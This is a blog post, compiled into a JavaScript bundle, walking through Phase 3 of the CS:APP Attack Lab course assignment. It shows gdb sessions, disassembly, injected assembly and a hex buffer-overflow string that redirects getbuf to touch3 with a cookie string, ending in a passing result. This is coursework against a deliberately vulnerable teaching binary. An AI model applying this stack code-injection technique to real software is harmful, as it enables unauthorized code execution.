import{_ as e,o as a,c as n,e as s}from"./app-CoV9NwP4.js";const t={},i=s(`<h6 id="run" tabindex="-1"><a class="header-anchor" href="#run"><span>Run</span></a></h6><div class="language-bash line-numbers-mode" data-ext="sh" data-title="sh"><pre class="language-bash"><code>$ gdb ctarget <span class="token parameter variable">--tui</span>
<span class="token punctuation">..</span>.
<span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> <span class="token builtin class-name">break</span> getbuf
Breakpoint <span class="token number">1</span> at 0x401b28: <span class="token function">file</span> buf.c, line <span class="token number">12</span>.
<span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> run <span class="token parameter variable">-q</span>
Starting program: /home/stu2020012872/3-lab-3-attacklab/target97/ctarget <span class="token parameter variable">-q</span>

Breakpoint <span class="token number">1</span>, getbuf <span class="token punctuation">(</span><span class="token punctuation">)</span> at buf.c:12
<span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> info registers rsp
rsp            0x55668cc0       0x55668cc0
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h6 id="run-1" tabindex="-1"><a class="header-anchor" href="#run-1"><span>Run</span></a></h6><div class="language-bash line-numbers-mode" data-ext="sh" data-title="sh"><pre class="language-bash"><code>objdump <span class="token parameter variable">--disassemble</span> ctarget <span class="token operator">&gt;</span> ctarget.asm
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h6 id="read-file-ctarget-asm" tabindex="-1"><a class="header-anchor" href="#read-file-ctarget-asm"><span>Read File <code>ctarget.asm</code></span></a></h6><div class="language-assembly line-numbers-mode" data-ext="assembly" data-title="assembly"><pre class="language-assembly"><code>...
0000000000401b28 &lt;getbuf&gt;:
  401b28:	48 83 ec 28          	sub    $0x28,%rsp
...
0000000000401c78 &lt;touch3&gt;:
...
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h6 id="write-file-phase-3-inject-s" tabindex="-1"><a class="header-anchor" href="#write-file-phase-3-inject-s"><span>Write File <code>phase-3-inject.s</code></span></a></h6><div class="language-assembly line-numbers-mode" data-ext="assembly" data-title="assembly"><pre class="language-assembly"><code>movq $0x55668cc8, %rdi
pushq $0x0000000000401c78
ret
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h6 id="run-2" tabindex="-1"><a class="header-anchor" href="#run-2"><span>Run</span></a></h6><div class="language-bash line-numbers-mode" data-ext="sh" data-title="sh"><pre class="language-bash"><code>gcc <span class="token parameter variable">-c</span> phase-3-inject.s
objdump <span class="token parameter variable">--disassemble</span> phase-3-inject.o <span class="token operator">&gt;</span> phase-3-inject.asm
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><h6 id="read-file-phase-3-inject-asm" tabindex="-1"><a class="header-anchor" href="#read-file-phase-3-inject-asm"><span>Read File <code>phase-3-inject.asm</code></span></a></h6><div class="language-assembly line-numbers-mode" data-ext="assembly" data-title="assembly"><pre class="language-assembly"><code>...
0000000000000000 &lt;.text&gt;:
   0:	48 c7 c7 c8 8c 66 55 	mov    $0x55668cc8,%rdi
   7:	68 78 1c 40 00       	pushq  $0x401c78
   c:	c3                   	retq
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h6 id="read-file-cookie-txt" tabindex="-1"><a class="header-anchor" href="#read-file-cookie-txt"><span>Read File <code>cookie.txt</code></span></a></h6><div class="language-text line-numbers-mode" data-ext="text" data-title="text"><pre class="language-text"><code>0x3a9a6c2f
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h6 id="convert-cookie-to-string" tabindex="-1"><a class="header-anchor" href="#convert-cookie-to-string"><span>Convert Cookie to String</span></a></h6><p>The string should end with a <code>\\0</code>.</p><div class="language-text line-numbers-mode" data-ext="text" data-title="text"><pre class="language-text"><code>33 61 39 61 36 63 32 66 00
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h6 id="write-file-phase-3-txt" tabindex="-1"><a class="header-anchor" href="#write-file-phase-3-txt"><span>Write File <code>phase-3.txt</code></span></a></h6><p>Place the string in the parent frame of <code>getbuf</code>, that is, <code>test</code> stack frames.</p><div class="language-text line-numbers-mode" data-ext="text" data-title="text"><pre class="language-text"><code>48 c7 c7 c8 8c 66 55
68 78 1c 40 00
c3
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
98 8c 66 55 00 00 00 00
33 61 39 61 36 63 32 66 00
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h6 id="run-3" tabindex="-1"><a class="header-anchor" href="#run-3"><span>Run</span></a></h6><div class="language-bash line-numbers-mode" data-ext="sh" data-title="sh"><pre class="language-bash"><code>./hex2raw <span class="token operator">&lt;</span> phase-3.txt <span class="token operator">&gt;</span> phase-3.in
./ctarget <span class="token parameter variable">-i</span> phase-3.in
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><h6 id="terminal-output" tabindex="-1"><a class="header-anchor" href="#terminal-output"><span>Terminal Output</span></a></h6><div class="language-text line-numbers-mode" data-ext="text" data-title="text"><pre class="language-text"><code>Cookie: 0x3a9a6c2f
Touch3!: You called touch3(&quot;3a9a6c2f&quot;)
Valid solution for level 3 with target ctarget
PASS: Sent exploit string to server to be validated.
NICE JOB!
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,24),l=[i];function r(c,d){return a(),n("div",null,l)}const p=e(t,[["render",r],["__file","2022-04-23-phase-3.html.vue"]]),u=JSON.parse('{"path":"/2022/course-work/csapp/attack-lab/2022-04-23-phase-3.html","title":"Attack Lab: Phase 3","lang":"en-US","frontmatter":{"date":"2022-04-23T00:00:00.000Z","isOriginal":true,"category":["Course Work"],"tag":["Attack Lab","Computer Organization and Architecture"],"title":"Attack Lab: Phase 3","description":"Run Run Read File ctarget.asm Write File phase-3-inject.s Run Read File phase-3-inject.asm Read File cookie.txt Convert Cookie to String The string should end with a \\\\0. Write F...","head":[["meta",{"property":"og:url","content":"https://blog.liblaf.me/2022/course-work/csapp/attack-lab/2022-04-23-phase-3.html"}],["meta",{"property":"og:site_name","content":"Blog"}],["meta",{"property":"og:title","content":"Attack Lab: Phase 3"}],["meta",{"property":"og:description","content":"Run Run Read File ctarget.asm Write File phase-3-inject.s Run Read File phase-3-inject.asm Read File cookie.txt Convert Cookie to String The string should end with a \\\\0. Write F..."}],["meta",{"property":"og:type","content":"article"}],["meta",{"property":"og:locale","content":"en-US"}],["meta",{"property":"og:updated_time","content":"2024-03-03T09:57:39.000Z"}],["meta",{"property":"article:author","content":"liblaf"}],["meta",{"property":"article:tag","content":"Attack Lab"}],["meta",{"property":"article:tag","content":"Computer Organization and Architecture"}],["meta",{"property":"article:published_time","content":"2022-04-23T00:00:00.000Z"}],["meta",{"property":"article:modified_time","content":"2024-03-03T09:57:39.000Z"}],["script",{"type":"application/ld+json"},"{\\"@context\\":\\"https://schema.org\\",\\"@type\\":\\"Article\\",\\"headline\\":\\"Attack Lab: Phase 3\\",\\"image\\":[\\"\\"],\\"datePublished\\":\\"2022-04-23T00:00:00.000Z\\",\\"dateModified\\":\\"2024-03-03T09:57:39.000Z\\",\\"author\\":[{\\"@type\\":\\"Person\\",\\"name\\":\\"liblaf\\",\\"url\\":\\"https://liblaf.me\\",\\"email\\":\\"i@liblaf.me\\"}]}"]]},"headers":[],"git":{"createdTime":1677217008000,"updatedTime":1709459859000,"contributors":[{"name":"liblaf","email":"30631553+liblaf@users.noreply.github.com","commits":3}]},"readingTime":{"minutes":0.92,"words":277},"filePathRelative":"2022/course-work/csapp/attack-lab/2022-04-23-phase-3.md","localizedDate":"April 23, 2022","excerpt":"<h6>Run</h6>\\n<div class=\\"language-bash\\" data-ext=\\"sh\\" data-title=\\"sh\\"><pre class=\\"language-bash\\"><code>$ gdb ctarget <span class=\\"token parameter variable\\">--tui</span>\\n<span class=\\"token punctuation\\">..</span>.\\n<span class=\\"token punctuation\\">(</span>gdb<span class=\\"token punctuation\\">)</span> <span class=\\"token builtin class-name\\">break</span> getbuf\\nBreakpoint <span class=\\"token number\\">1</span> at 0x401b28: <span class=\\"token function\\">file</span> buf.c, line <span class=\\"token number\\">12</span>.\\n<span class=\\"token punctuation\\">(</span>gdb<span class=\\"token punctuation\\">)</span> run <span class=\\"token parameter variable\\">-q</span>\\nStarting program: /home/stu2020012872/3-lab-3-attacklab/target97/ctarget <span class=\\"token parameter variable\\">-q</span>\\n\\nBreakpoint <span class=\\"token number\\">1</span>, getbuf <span class=\\"token punctuation\\">(</span><span class=\\"token punctuation\\">)</span> at buf.c:12\\n<span class=\\"token punctuation\\">(</span>gdb<span class=\\"token punctuation\\">)</span> info registers rsp\\nrsp            0x55668cc0       0x55668cc0\\n</code></pre></div>","autoDesc":true}');export{p as comp,u as data};
